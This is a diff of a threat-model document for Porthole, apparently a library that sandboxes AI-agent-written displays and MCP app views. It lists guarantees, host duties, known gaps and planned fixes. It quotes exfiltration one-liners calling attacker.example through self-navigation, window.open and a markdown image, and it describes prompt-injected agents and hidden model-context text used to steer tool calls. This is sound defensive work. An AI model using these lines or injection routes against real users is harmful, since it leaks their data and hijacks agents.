@@ -5,9 +5,10 @@ What Porthole protects, from whom, and where that protection ends. For each way 
 guaranteed. [ADOPTING.md](ADOPTING.md) says how to set each one up, and
 [DESIGN.md](DESIGN.md) lists every defense with the test that proves it.
 
-**Status.** This describes `main` as of 2026-10-19 (0.7.0 and P097). A review that day found
-gaps, and their fixes are on branches still being merged. A guarantee that holds only once a
-fix lands is marked **open until `audit-…`**; [§8](#8-fixes-in-flight) lists the branches.
+**Status.** This describes `main` as of 2026-10-19 (0.7.0, with P093 and P097). A review that day
+found gaps, and their fixes are planned or in review. A note **open until P0xx** means the gap
+exists on `main` today and decision P0xx is its planned fix; once that fix merges, the note
+becomes a guarantee. [§8](#8-fixes-in-flight) lists the decisions.
 
 ## 1. Two layers
 
@@ -24,6 +25,7 @@ Porthole has two layers, and most hosts need only the first.
   the host's backend into the picture: who may call what, per version, revocation, and each
   person's data.
 
+A host that only shows content can skip the app runtime, and the parts of this document about it.
 [§7](#7-the-display-layer-and-the-app-runtime) says what each layer guarantees.
 
 ## 2. What is protected
@@ -42,7 +44,7 @@ Porthole has two layers, and most hosts need only the first.
 | --- | --- | --- | --- |
 | (a) | An agent steered by prompt injection, writing hostile content | the content of any display it writes | S1–S4 |
 | (b) | A third-party MCP server | its MCP Apps view | S5 |
-| (c) | The author of a public link, against its visitors | a served page that strangers open | S4 |
+| (c) | The author of a page others open: a public link's author against its visitors, or a page on a sibling label of the same content domain | a served page | S3, S4, S6 |
 | (d) | The app being previewed | an app on a content origin (url mode) | S6 |
 | (e) | Other content on the same page | a sibling frame | S7, and S2 |
 
@@ -68,28 +70,35 @@ the agent, but it is not a wall.
      them.
 
 The app runtime adds a third: **the host's API is the wall for its data.** The bridge refuses a
-call the page didn't declare, or that the viewer's level doesn't allow, before any handler runs;
-the host's API checks again, since a call that reaches the API some other way can claim any viewer
-and any declaration.
+call the page didn't declare (`undeclared`), or that the viewer's level doesn't allow, before any
+handler runs. (Without a viewer, the names a page declares in `data` aren't held yet: open until
+P094.) The host's API checks again, since a call that reaches the API some other way can claim any
+viewer and any declaration.
 
-The leak suite attempts each channel from inside the content on Chromium, WebKit and Firefox, and
-most defenses have a negative control that takes the defense out to show its probes then fail
-(DESIGN.md § "Egress hardening, each with its test"). CI runs the negative controls of the
-runtime only, and its runner can count a control that didn't run as passed (open until
-`audit-controls`).
+The leak suite attempts each channel in DESIGN.md's table from inside the content, on Chromium,
+WebKit and Firefox, and most defenses have a negative control that takes the defense out to show
+its probes then fail (DESIGN.md § "Egress hardening, each with its test"). CI runs the negative
+controls of the runtime only, and its runner can count a control that didn't run as passed (open
+until P096).
 
 ## 5. Out of scope
 
 Porthole does not protect against these.
 
 - **Availability in the viewer's browser.** Content can loop, allocate without bound, or fill the
-  content domain's cookies. Porthole has no watchdog: the only timer is the load timeout, nothing
-  unloads a frame that stops answering, and nothing limits its CPU or memory. An opaque frame may
-  share the host page's process (the browser decides), so a loop in it can stall the host's tab; a
-  served frame is on another site, which browsers with site isolation put in a process of its own.
-  In scope, by contrast: a page or a request that can crash the host's server (SECURITY.md), and a
-  message from content that makes the host's page do unbounded work. The known cases are being
-  fixed (open until `audit-server` and `audit-adapters`).
+  content domain's cookies. Porthole has no watchdog: nothing but the load timeout watches a
+  frame, nothing unloads a frame that stops answering, and nothing limits its CPU or memory. An
+  opaque frame may share the host page's process (the browser decides), so a loop in it can stall
+  the host's tab; a served frame is on another site, which browsers with site isolation put in a
+  process of its own. In scope, by contrast: a page or a request that can crash the host's server,
+  and a message from content that makes the host's page do unbounded work (SECURITY.md). The known
+  cases are being fixed (open until P092 and P095).
+- **Browser bugs, and what the leak suite doesn't run on.** The walls are the browser's own (the
+  sandbox, CSP, same-origin policy, site isolation): a bug in them is outside Porthole. The suite
+  runs Chromium, WebKit and Firefox through Playwright; other engines, versions and embedded
+  WebViews are untested. Side channels between processes are out too: an opaque frame that shares
+  the host's process may learn about it by timing (Spectre-class attacks); domain mode puts content
+  on another site.
 - **Markdown-image exfiltration in chat renderers** (the EchoLeak and CamoLeak class: a model's
   reply holds `![](https://attacker.example/?q=<secret>)` and the chat loads it). That is the
   chat's own rendering of model text. Porthole's walls apply to HTML handed to a display.
@@ -97,10 +106,10 @@ Porthole does not protect against these.
   Porthole limits where what is typed into it can go and keeps the host's approvals outside the
   frame; it doesn't judge what content shows.
 - **Wrong results.** A chart can plot the wrong numbers, and a report can say false things.
-- **Malicious prompts.** A gated `sendPrompt` shows the person the whole text before it is sent;
-  whether that text is hostile is not Porthole's call. Nor is text content puts in the model's
-  context (S5).
-- **The sense of a confirmed action.** A confirmation shows the call and its arguments. Whether
+- **Malicious prompts.** A gated `sendPrompt` hands the host's confirm function the whole text (the
+  default dialog shows all of it); whether that text is hostile is not Porthole's call. Nor is text
+  content puts in the model's context (S5).
+- **The sense of a confirmed action.** A confirmation is given the call and its arguments. Whether
   doing it is wise is the person's decision, and what the host's handler then does is the host's.
 
 ## 6. Scenarios
@@ -109,11 +118,31 @@ Porthole does not protect against these.
 | --- | --- | --- | --- | --- |
 | [S1](#s1-inline-widgets-in-a-conversation) | Inline widgets in a conversation | `inlineWidget`, opaque | (a) | every page sends `embedderCsp` |
 | [S2](#s2-live-widgets-content-that-reads-the-hosts-data) | Live widgets that read the host's data | `liveWidget` | (a), (e) | as S1, and the page follows S7 |
-| [S3](#s3-private-artifacts) | Private artifacts | `artifact`, domain | (a) | the content domain is the host's alone, the secret is random, `authorize` revokes |
-| [S4](#s4-public-links-and-pages-that-are-apps) | Public links, and pages that are apps | `artifact`, domain, public grants; `runtime` | (a), (c) | `audit-tab-sandbox` and `audit-gates` have merged, and the host handles abuse |
+| [S3](#s3-private-artifacts) | Private artifacts | `artifact`, domain | (a), (c) | the content domain is the host's alone, the secret is random, `authorize` revokes |
+| [S4](#s4-public-links-and-pages-that-are-apps) | Public links, and pages that are apps | `artifact`, domain, public grants; `runtime` | (a), (c) | P099 and P094 have merged, and the host handles abuse |
 | [S5](#s5-third-party-mcp-apps) | Third-party MCP Apps | `mcpApp` | (b) | the host shows a view's domains and its model context |
-| [S6](#s6-previews-of-a-running-app) | Previews of a running app | `url` | (d) | the code is the host's own |
+| [S6](#s6-previews-of-a-running-app) | Previews of a running app | `url` | (d), (c) | the code is the host's own |
 | [S7](#s7-several-displays-on-one-page) | Several displays on one page | any | (e) | the page follows the composition rule |
+
+### What every host must do
+
+Whatever the use:
+
+- Send `displays.embedderCsp(…)` (the page's `frame-src`) on every page that shows displays, and
+  run `defineHostConformance` against the real page in CI (S1 says why).
+- Keep the default gates. A capability's `gates` in a config replace its defaults whole, even
+  `[]`; a preset's `options.capabilities` entry replaces the preset's whole entry, gates included
+  (`liveWidget({ capabilities: { readData: {} } })` drops its consent).
+- Give the confirmations and the consent it draws itself the default dialog's protections: drawn
+  on the host's page outside every frame, showing the call's whole effect, Cancel focused, and the
+  accept button ignoring presses for 500 ms after it opens, so a click meant for the content can't
+  land on it. The React binding's dialog does all of this for confirmations; consent is always the
+  host's own UI. A copy notice of its own shows what went on the clipboard (S1).
+- Show the text content reports (its errors, a blocked navigation's address, an annotation's
+  quoted text) only as text, never as HTML.
+- List every app origin in `appOrigins` (`hostOrigins` in `/server`): only those may frame content,
+  and only those are checked against the content domain for a shared site.
+- Under the app runtime, run `defineRuntimeConformance` with `api` in CI (§7).
 
 ### S1. Inline widgets in a conversation
 
@@ -134,10 +163,10 @@ Porthole does not protect against these.
 
   | Host function | Default gates |
   | --- | --- |
-  | `sendPrompt` | a user gesture, then a confirmation showing the whole text |
+  | `sendPrompt` | a user gesture, then the host's confirmation, given the whole text |
   | `openLink` | a gesture and a confirmation; http(s) only, no credentials in the URL |
   | `downloadFile` | a gesture and a confirmation |
-  | `copyText` | a gesture, 30 a minute; the host does the copy and shows what it copied |
+  | `copyText` | a gesture, 30 a minute; the host writes the clipboard |
   | `callTool` | a confirmation |
   | `setModelContext` | 30 a minute, nothing else |
   | `readData`, `subscribeData` | 120 and 60 a minute (`liveWidget` adds consent) |
@@ -152,7 +181,7 @@ Porthole does not protect against these.
 
 **The host must**
 
-- Send `displays.embedderCsp(…)` on every page that shows displays (`frame-src 'none'` where all
+- Send the page's `frame-src` (`displays.embedderCsp(…)`; `frame-src 'none'` where all displays
   are opaque). An opaque frame can navigate itself away with data in the URL
   (`location = "https://attacker.example/?" + data`): its own CSP can't stop that, and the shell
   gets no navigation events in an opaque origin. The embedding page's `frame-src` is the only
@@ -161,15 +190,19 @@ Porthole does not protect against these.
   self-navigation ones included, and it is the only check that the page sends that CSP: nothing
   checks it when a display mounts.
 - Keep `anyHttps` off inline widgets: an image URL is a way out (P059).
-- Draw confirmations outside the frame (the React binding's default dialog does).
+- Show what a copy put on the clipboard. The React binding's toast shows at most its first four
+  lines and 280 characters; a host's own `copyText` handler replaces the toast, and must show it
+  itself.
 
 **Not guaranteed**
 
 - On a page without that `frame-src`, a widget can send out whatever it was shown.
+- `copyText` needs only a gesture, not a confirmation: a widget can put text the person didn't
+  choose on their clipboard when they click in it (pastejacking). The notice above is what tells
+  them.
 - `setModelContext`, where the host declares it, is rate-limited only: a widget can put text in
   the model's next turn without the person seeing it, and the runtime's manual tells the agent
-  that this text "tells you what the person is looking at" (open until `audit-model-context`; see
-  S5).
+  that this text "tells you what the person is looking at" (open until P100; see S5).
 - The host's gesture check reads its own page's `navigator.userActivation` (in an engine without
   it, the check passes). A gesture shows a moment of intent, not consent: the person may have
   clicked the host a moment before.
@@ -180,7 +213,8 @@ Porthole does not protect against these.
 `presets.liveWidget`: an inline widget that shows the host's data, current, as the viewer may see
 it.
 
-**Porthole guarantees**
+**Porthole guarantees**, with the preset's defaults (see the host's duties below for what undoes
+them):
 
 - No network of its own: the preset refuses an `egress` option. Served, the only scripts it may
   load are Porthole's Chart.js and D3, from its own origin (`/__porthole/lib/`).
@@ -199,30 +233,40 @@ it.
 - Send the page's `frame-src`, and show opaque live widgets only on pages that frame no content
   origins (an opaque frame's only wall against navigating away is that `frame-src`).
 - Not add origins through a capability's own `connect` or `resource` lists: they open the network
-  the preset keeps closed.
+  the preset keeps closed, and the preset doesn't refuse them (open until P103).
+- Not pass `readData` or `subscribeData` in `options.capabilities` without their gates: an entry
+  there replaces the preset's, consent included.
 - Follow the composition rule (S7): no url-mode or `anyHttps` displays on the same page.
 
 **Not guaranteed**
 
 - What a neighbouring frame does with data handed to it (S7).
 - A result the host pushes with `changed(result)` answers the next read without `readData`'s own
-  gates, having passed only `subscribeData`'s (open until `audit-gates`). With the preset's
-  defaults both have the same consent; it matters where `readData` is made stricter.
+  gates, having passed only `subscribeData`'s (open until P094). With the preset's defaults both
+  have the same consent; it matters where `readData` is made stricter.
 - In an engine without the Navigation API, a served frame's navigation falls back to the page's
   `frame-src`: outside sites stay shut, other content origins don't (P079).
-- `LIBRARY_CDNS` displays are allowed on the same page (ADOPTING.md), but they may fetch from four
-  public package CDNs (cdnjs, jsDelivr, unpkg, esm.sh), and the path of such a request is a narrow
-  channel out, read by the CDN's operator (P048). Keep highly sensitive data off pages with them.
+- `LIBRARY_CDNS` displays are allowed on the same page (ADOPTING.md), but they reach nine
+  origins: fetches, scripts, styles, fonts and images to four package CDNs (cdnjs, jsDelivr,
+  unpkg, esm.sh), and scripts, styles or fonts from five more (Google Fonts' two, Tailwind's,
+  jQuery's and Plotly's). The path of every such request is a narrow channel out, read by that
+  CDN's operator (P048). Keep highly sensitive data off pages with them.
 
 ### S3. Private artifacts
 
 `presets.artifact` with `isolation: "domain"`, served by the host kit to a signed-in viewer.
 
+Terms used below: a page's **clean address** is its address on its own content origin, with no
+ticket in it, the one a person opens in a tab or shares (a path on `<label>.<content domain>`). A
+framed page's **sealed files address** is `/__porthole/f/<sealed>/`: the frame's session,
+encrypted into the path, since WebKit keeps no cookie in a frame (P083).
+
 **Porthole guarantees**
 
 - An origin per storage scope on the content domain, by default a label made from an HMAC of the
-  scope under a key derived from the host's secret (120 bits). A label is an address, not a secret: a host may name
-  them itself (`prefixedName`), and access is the ticket's and the cookie's job.
+  scope under a key derived from the host's secret (120 bits). A label is an address, not a
+  secret: a host may name labels itself (`prefixedName`), and access is the ticket's and the
+  cookie's job.
 - `createContentHost` refuses a content domain that holds an app origin or may share a site with
   one (`ContentDomainError`), and a served mount refuses a content origin same-site with the app.
   With `health` configured, frames fall back to opaque while the content domain doesn't answer.
@@ -245,28 +289,32 @@ it.
 - Give a secret of at least 32 random bytes (`npx porthole secret`). Porthole checks only its
   length, and where `health` is configured the health route answers with a value derived from it,
   so a guessable secret can be tested offline.
-- Give a per-request check (`authorize`) to revoke: sessions are signed and stateless, so without it
-  a cookie is good for its whole life (an hour by default, up to 30 days). Leave its answers
+- Give a per-request check (`authorize`) to revoke: sessions are signed and stateless, so without
+  it a cookie is good for its whole life (an hour by default, up to 30 days). Leave its answers
   uncached (the default; `authorizeTtlSeconds` in the host kit) or call `content.forget(…)` when
   revoking, or a cached answer holds for up to that long.
 - Send the page's `frame-src`.
 
 **Not guaranteed**
 
-- Until the content domain is on the PSL, its labels are same-site with each other (P047). A
-  domain-mode page has `allow-same-origin`, so it can set cookies for the whole content domain (in
-  a frame, within what the browser allows a third-party frame). `__Host-` keeps them off its
-  sessions' cookies, but:
-  - under https Porthole also takes unprefixed `porthole-*` cookies, and its "entered" mark doesn't
-    name its label, so a page can plant a mark that makes another label's clean address answer
-    "Open this in a new tab" (open until `audit-cookies-url`);
+- Until the content domain is on the PSL, its labels are same-site with each other (P047), so a
+  page on one label can attack another (c). A domain-mode page has `allow-same-origin`, so it can
+  set cookies for the whole content domain (in a frame, within what the browser allows a
+  third-party frame). `__Host-` keeps them off its sessions' cookies, but:
+  - under https Porthole also takes unprefixed `porthole-*` cookies. One of them is the
+    **entered mark**, which a browser gets on coming back to a clean address from the app's
+    authorize route (and its sign-in); seen again, it tells Porthole the browser keeps no cookies
+    there, and the address answers "Open this in a new tab" instead of looping through sign-in.
+    The mark doesn't name its label, so a page can plant it for the whole domain and make other
+    labels' clean addresses answer that way (open until P101);
   - enough large cookies make every request from that browser to the content domain too large to
     serve ([§5](#5-out-of-scope)).
-- A framed page's sealed files address is a bearer credential for its version's files until the
-  session ends (P083); outside a browser, `Sec-Fetch-Site` can be forged to keep using it after
-  its first hour.
+- A sealed files address is a bearer credential for its version's files until the session ends
+  (P083): anyone holding it can load them. It opens on its own for its first hour, then only for
+  the page's own loads (`Sec-Fetch-Site: same-origin`), which a client outside a browser can claim.
 - A revocation reaches the next request. It doesn't reach a page already running, an open
-  WebSocket, pinned files the browser cached (immutable for a year), or assets in bearer mode.
+  WebSocket, pinned files the browser cached (immutable for a year), or assets in bearer mode
+  (§7).
 
 ### S4. Public links, and pages that are apps
 
@@ -281,8 +329,8 @@ the attacker (c), and its readers are strangers.
   runtime's own host functions (`user`, `comments`, `artifact`, `assets`, `db`) and every method
   above `view`.
 - The page is on a site that isn't the host's (its sibling labels share one until the content
-  domain is on the PSL, S3); a label is one DNS label, never of the form IDNA reserves
-  (`xn--`), so it never displays as another name; pages say `noindex`; a file of a type Porthole
+  domain is on the PSL, S3); a label is one DNS label, never of the form IDNA reserves (`xn--`),
+  so it is never punycode for another name; pages say `noindex`; a file of a type Porthole
   doesn't know is served as a download.
 - `authorize` is the host's takedown switch.
 
@@ -297,17 +345,17 @@ the attacker (c), and its readers are strangers.
 - Rate-limit the issue endpoint (`rateLimit`: optional, per process) by a key it trusts
   (`rateLimit.key`). By default an anonymous request is keyed on `CF-Connecting-IP`, else
   `X-Forwarded-For`, which a client sets unless an edge in front replaces them (open until
-  `audit-server`).
+  P092).
 - Check pages for secrets before publishing them: `lintContent` has no rule for credentials.
 
 **Not guaranteed**
 
 - A page opened in a tab has no sandbox. The shell guards its navigation and `document.write`,
   but a click can run `window.open("https://attacker.example/?" + whatTheVisitorTyped)`, past
-  `connect-src` and `form-action` (open until `audit-tab-sandbox`). In a frame the sandbox has no
+  `connect-src` and `form-action` (open until P099). In a frame the sandbox has no
   `allow-popups`, so this is about tabs, which is how public links are usually opened.
 - Without a viewer, a runtime page's declared `data` names aren't held: it can read and follow
-  any resource the host's handlers serve (open until `audit-gates`).
+  any resource the host's handlers serve (open until P094).
 - `db` and `user` reach the author without any network: what viewers write, and `user.get()`'s
   `{ id, name, level }`, the page can read and keep in `db`. Closed egress doesn't cover a channel
   the host itself provides. Give `id` a per-artifact pseudonym (`pseudonymFor`), and decide what
@@ -335,10 +383,13 @@ the attacker (c), and its readers are strangers.
 
 **The host must**
 
+- Send the page's `frame-src`, as for every display.
 - Show the person the domains a view declares before mounting it (`readViewResource(…).egress`
   and `viewEgress()` give them; the spec says hosts SHOULD warn). Porthole has no prompt for it.
-- Show what a view sets as model context, or gate `setModelContext` with `consent` (until
-  `audit-model-context` makes one of them the default).
+- Route `callTool` only to the view's own server, and refuse the tools the view may not call
+  (`_meta.ui.visibility`): that is the host's `callTool` handler's decision alone.
+- Show what a view sets as model context, or gate `setModelContext` with `consent` (until P100
+  makes one of them the default).
 - Keep `callTool`'s confirmation.
 
 **Not guaranteed**
@@ -348,9 +399,9 @@ the attacker (c), and its readers are strangers.
 - Code from `resourceDomains` runs in the frame (still isolated).
 - `setModelContext` (`ui/update-model-context`) is rate-limited only, 30 a minute. A view can put
   text in the model's next turn without the person seeing it and steer the model to call other
-  tools, which the gates on the view's own calls don't catch (open until `audit-model-context`).
-- `callTool` has no rate by default, and waiting confirmations have no cap, so a view can queue
-  them without end (open until `audit-adapters`).
+  tools, which the gates on the view's own calls don't catch (open until P100).
+- `callTool` has no rate by default (open until P103), and waiting confirmations have no cap (open
+  until P095), so a view can queue them without end.
 - The public suffixes Porthole refuses wildcards over are its own short list, not the whole PSL.
 
 ### S6. Previews of a running app
@@ -363,32 +414,37 @@ the attacker (c), and its readers are strangers.
   `sandbox="allow-scripts allow-same-origin allow-forms"`. A host may add popups (and popups that
   escape the sandbox), modals and downloads; top navigation never.
 - Access: the same ticket and cookie as served pages. The upstream origin is fixed in the signed
-  session (the viewer can't change it), and Porthole's cookies never reach the app, whatever relays
-  it.
-- Through `proxyTo`, Porthole's HTTP relay (the host's `upstream`): requests go with
-  `redirect: "manual"`; `Host`, hop-by-hop headers, `X-Forwarded-*`, `Forwarded` and `X-Real-IP`
-  are dropped; an `Origin` or `Referer` naming the content origin is rewritten to the app's, and any
-  other goes as sent, so an app that checks `Origin` sees a foreign one. A relay of the host's own
-  gets only what the host does (`upstreamHeaders` gives it the same rewrite), and so do
-  WebSockets: on Node, Porthole checks the access and removes its cookies, then hands the socket to
-  the host's `appSocket`.
+  session; the viewer can't change it.
+- Porthole's own cookies are removed before a request reaches the host's `upstream` (HTTP), and
+  before the Node adapter hands a WebSocket to the host's `appSocket`.
+- `proxyTo`, Porthole's HTTP relay (pass it as `upstream`), also rewrites the headers:
+  - requests go with `redirect: "manual"`;
+  - `Host`, hop-by-hop headers, `X-Forwarded-*`, `Forwarded` and `X-Real-IP` are dropped;
+  - an `Origin` or `Referer` naming the content origin is rewritten to the app's; any other goes
+    as sent, so an app that checks `Origin` sees a foreign one.
 
 **The host must**
 
 - Preview only code it trusts: the app gets no shell and no egress control (P020).
 - Refuse, in its `instance` callback, upstream addresses it doesn't mean (loopback, private
   networks): Porthole takes any http(s) URL, and the client's proposal is untrusted (SSRF).
+- In a relay of its own, rewrite the headers as `proxyTo` does
+  (`upstreamHeaders.request(headers, { origin, target })`). A WebSocket relay that takes the
+  access from `content.access(request)` gets the browser's whole `Cookie` header, Porthole's
+  cookies included: send the app the headers `upstreamHeaders.request(…, { websocket: true })`
+  makes (Porthole's cookies removed, the upgrade's own headers kept).
 - Keep previews off pages with displays that read data (S7).
 
 **Not guaranteed**
 
 - The app's network is its own.
 - HTTP requests and WebSockets to the app aren't checked for `Origin` or `Sec-Fetch-Site`.
-  Another url-mode app on the same page (framed cookies are `SameSite=None`), or a sibling label in
-  a tab (same-site, so `Lax` cookies go too), can send requests with the app's cookie and open its
-  WebSockets; an app that doesn't check `Origin` itself, as many dev servers don't, can be driven
-  by them (open until `audit-cookies-url`).
-- Through `proxyTo`, `True-Client-IP` and `CF-Connecting-IP` reach the app as the client sent them.
+  Another url-mode app on the same page (framed cookies are `SameSite=None`), or a page on a
+  sibling label in a tab (same-site, so `Lax` cookies go too), can send requests with the app's
+  cookie and open its WebSockets; an app that doesn't check `Origin` itself, as many dev servers
+  don't, can be driven by them (open until P101).
+- Through `proxyTo`, `True-Client-IP` and `CF-Connecting-IP` reach the app as the client sent
+  them.
 - The app is a sibling of every other content origin, with no CSP of Porthole's beyond
   `frame-ancestors`: S3's cookie problems are easier from here.
 
@@ -401,7 +457,7 @@ can be handed to the display with the widest network.
 | Beside a display that reads the host's data or holds what the person types | |
 | --- | --- |
 | Closed egress, or Porthole's libraries | Fine. |
-| `LIBRARY_CDNS` | Fine for ordinary data. A request path to a CDN is a narrow channel read by its operator: not for highly sensitive data. |
+| `LIBRARY_CDNS` | Fine for ordinary data. Every request path to its nine origins is a narrow channel read by their operators: not for highly sensitive data. |
 | An MCP view with `connectDomains` | Its domains become the page's. |
 | `anyHttps` | No: any image URL is a way out. |
 | url mode | No: the app's network is its own. |
@@ -419,35 +475,40 @@ What it is: the presets, the isolation, the egress walls, the shell, the bridge 
 host functions (`sendPrompt`, `openLink`, `downloadFile`, `copyText`, `callTool`, `readData`,
 `subscribeData`, `setModelContext`, `reportError`, annotations) and the generated manual.
 
-**Porthole guarantees** the two lines of [§4](#4-two-lines-of-defense) for each display: isolation,
-closed egress, the gates. One config generates the CSP, the sandbox, the shell's wiring and the
-manual, and a test holds them in agreement (`test/agreement.test.ts`), so the agent is told what
-the sandbox allows. The leak suite proves each wall on three engines, and `defineHostConformance`
-runs it against a host's own page.
+**Porthole guarantees** the two lines of [§4](#4-two-lines-of-defense) for each display except url
+mode (S6), with S1–S5's open items: isolation, closed egress, the gates. One config generates the
+CSP, the sandbox, the shell's wiring and the manual, and a test holds them in agreement
+(`test/agreement.test.ts`), so the agent is told what the sandbox allows. The leak suite tests each
+wall on three engines, and `defineHostConformance` runs it against a host's own page.
 
-**The host must** send its page's `frame-src`, write the handlers (their effects are its own),
-draw confirmation and consent outside the frame, and group displays by page (S7).
+**The host must** do what [every host](#what-every-host-must-do) does, write the handlers (their
+effects are its own), and group displays by page (S7).
 
 ### The app runtime
 
 What it is: `config.runtime: "1"`, for inline widgets and artifact pages. A page reaches the
 host's services through `porthole.use(name)`. Without it there is no `porthole` global, and the
-config can't name the runtime's own host functions.
+config can't name the runtime's own host functions. A host that only shows content can skip this
+section.
 
 **Porthole guarantees**, in the bridge, before any handler runs:
 
 - A page reaches the built-ins its kind offers (`clipboard`, `links`, `downloads`, `comments`) and
-  what it declared when published; anything else is refused (`undeclared`). A page from before 0.7
-  (the host's `null` declaration) keeps 0.6's surface and gets none of `user`, `artifact`,
-  `assets` and `db`.
+  what it declared when published; anything else is refused (`undeclared`). Without a viewer, the
+  names it declares in `data` aren't held yet (open until P094). A page from before 0.7 (the
+  host's `null` declaration) keeps 0.6's surface and gets none of `user`, `artifact`, `assets` and
+  `db`.
 - Each method has a least level (`view < interact < admin < owner`), held against the viewer's
   level from the host's `access`. A display without a viewer gets nothing above `view` and none of
   the runtime's own host functions.
+- A version mounted with `intersectDeclarations(version's, current)` gets only what both
+  declarations allow (P093).
 - `db`: another person's `data/users/<id>` is refused at every level; `me` is the host's id for
   the viewer, and paths in answers say `data/users/me`, never that id.
 - What changes the artifact for everyone needs, by default, a gesture and a confirmation:
   `artifact.publish` and `assets.delete` (a host's `methodGates` for them replace these).
-- Assets are served only to an access for their own artifact, after the host's check. A
+- Except in **bearer mode** (`AssetStore.bearer`, an opt-in that serves an asset to anyone with
+  its id), assets are served only to an access for their own artifact, after the host's check. A
   code-typed asset runs as code only when an admin uploaded it where uploaded code may run;
   anything else is a download.
 - `comments` is write-only: the page learns only whether the composer opened.
@@ -458,16 +519,15 @@ config can't name the runtime's own host functions.
 
 - Treat its API as the wall: check each call again from its own session and its own stored
   declaration, never from `context.viewer` or `context.declared`.
+- Run `defineRuntimeConformance` with `api` in CI, against its real API.
 - Say each viewer's level in `access`, and keep public grants low (S4).
 - Store a declaration per version, and mount a version with
-  `intersectDeclarations(version's, current)`. Until `audit-declarations` merges, a wildcard rule
-  (`*`) in the current declaration doesn't narrow a version's rule for a named collection, and a
-  collection named `__proto__` is lost from the result.
+  `intersectDeclarations(version's, current)`.
 - Revoke with its per-request check (`authorize`) and `content.forget(…)`.
 - Keep each person's data apart in its own stores, and refuse moved bases and versions
   (`Refused("conflict")`).
 - Set the same `methodGates` on `db.batch` and `db.watch` as on the methods they run: a batch and
-  a watch take their inner methods' levels but not their gates (open until `audit-gates`).
+  a watch take their inner methods' levels but not their gates (open until P094).
 - Handle abuse on shared pages (S4).
 
 **Not guaranteed**
@@ -476,27 +536,30 @@ config can't name the runtime's own host functions.
   what a viewer types into it, it can store in `db`, where its author (and other viewers, as the
   page's rules allow) can read it.
 - `db` rewrites only paths: an id the page stores inside a document's data is returned as stored.
-- Assets in bearer mode (an opt-in) are served by id alone, without the host's check, and a
-  trusted code asset as code even if the config no longer lets uploaded code run.
+- In bearer mode, assets are served by id alone, without the host's check, and a trusted code
+  asset as code even if the config no longer lets uploaded code run (open until P103).
 
 ## 8. Fixes in flight
 
-Each branch below closes one or more of the "open until" notes above. When it merges, its notes
-here become guarantees.
+The decisions below come from the 2026-10-19 review. "Planned" means not yet on `main`: the gap
+its row names exists today, and the sections it cites say "open until" that decision.
 
-| Branch | Entry | Closes | Sections |
+| Decision | State | What it closes | Sections |
 | --- | --- | --- | --- |
-| `audit-server` | P092 | A request with a method `fetch` refuses (`TRACE`) can end a Node process through the Node adapter; the issue endpoint reads a JSON body without a byte limit, before the host's `access`; its rate limit keys anonymous requests, by default, on headers a client sets. | §5, S4 |
-| `audit-declarations` | P093 | `intersectDeclarations` compares rules key by key, so a current wildcard doesn't narrow a version's named rule; `__proto__` is lost. | §7 |
-| `audit-gates` | P094 | Without a viewer, a page's declared data names aren't held; a pushed result answers a read past `readData`'s gates; `db.batch` and `db.watch` skip their inner methods' `methodGates`. | S2, S4, §7 |
-| `audit-adapters` | P095 | What content sends is read before its gate: a log or error report is serialized whole first; waiting confirmations have no cap. | §5, S5 |
-| `audit-controls` | P096 | The negative-control runner counts a control that didn't run as passed, and CI runs the runtime's controls only. | §4 |
-| `audit-flakes` | — | The leak suite's unstable cases. No guarantee here depends on it, but a red run hides a real regression. | |
-| `audit-tab-sandbox` | P099 | A served page in a tab has no sandbox: `window.open` sends input out. | S4 |
-| `audit-model-context` | P100 | `setModelContext` is rate-limited only, unseen by the person. | S1, S5 |
-| `audit-cookies-url` | P101 | Unprefixed cookies under https; the entered mark carries no label; url mode checks neither `Origin` nor `Sec-Fetch-Site`. | S3, S6 |
+| P092 | Planned | A request with a method `fetch` refuses (`TRACE`) can end a Node process through the Node adapter; the issue endpoint reads a JSON body without a byte limit, before the host's `access`; its rate limit keys anonymous requests, by default, on headers a client sets. | §5, S4 |
+| P093 | Merged | `intersectDeclarations` compared rules name by name, so a current wildcard didn't narrow a version's named rule, and a collection named `__proto__` was lost. Now the result allows exactly what both sides allow. | §7 |
+| P094 | Planned | Without a viewer, a page's declared `data` names aren't held; a pushed result answers a read past `readData`'s gates; `db.batch` and `db.watch` skip their inner methods' `methodGates`. | §4, S2, S4, §7 |
+| P095 | Planned | What content sends is read before its gate: a log or error report is serialized whole first; waiting confirmations have no cap. | §5, S5 |
+| P096 | Planned | The negative-control runner counts a control that didn't run as passed, and CI runs the runtime's controls only. | §4 |
+| P097 | Merged | A release waits for the same commit's CI. No guarantee here depends on it. | |
+| P098 | Planned | The leak suite's unstable cases. No guarantee here depends on it, but a red run hides a real regression. | |
+| P099 | Planned | A served page in a tab has no sandbox: `window.open` sends input out. | S4 |
+| P100 | Planned | `setModelContext` is rate-limited only, unseen by the person. | S1, S5 |
+| P101 | Planned | Unprefixed cookies under https; the entered mark carries no label; url mode checks neither `Origin` nor `Sec-Fetch-Site`. | S3, S6 |
+| P102 | | This document. | |
+| P103 | Planned | A live widget's capabilities can add origins; bearer-mode assets skip the code re-check; `callTool` has no rate. | S2, S5, §7 |
 
-Open with no branch yet; until then they are the host's to cover:
+Open with no decision yet; until then they are the host's to cover:
 
 - a check, at mount or in development, that the page sends its `frame-src` (S1: run
   `defineHostConformance`);
